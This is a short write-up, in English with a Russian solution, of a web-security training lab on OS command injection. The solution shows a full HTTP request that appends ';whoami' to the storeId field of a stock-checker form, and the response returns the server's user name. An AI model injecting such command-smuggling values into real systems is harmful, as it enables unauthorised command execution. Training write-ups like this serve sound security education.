# OS command injection, simple case
APPRENTICE

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user.

## Решение
Форма проверки наличиая товара отправляет на сервер POST-запрос с параметрами `productId=1&storeId=1`. Добавлю к ID хранилища строку `;whoami`:
```
POST /product/stock HTTP/2
Host: 0aa300f204dee15e8498f4070009008b.web-security-academy.net
Cookie: session=xT1WgaMwfd42T1WtIJE4cZg3RcafaokU
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300f204dee15e8498f4070009008b.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0aa300f204dee15e8498f4070009008b.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

productId=1&storeId=1;whoami
```
```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

62
peter-mHaJHz

```
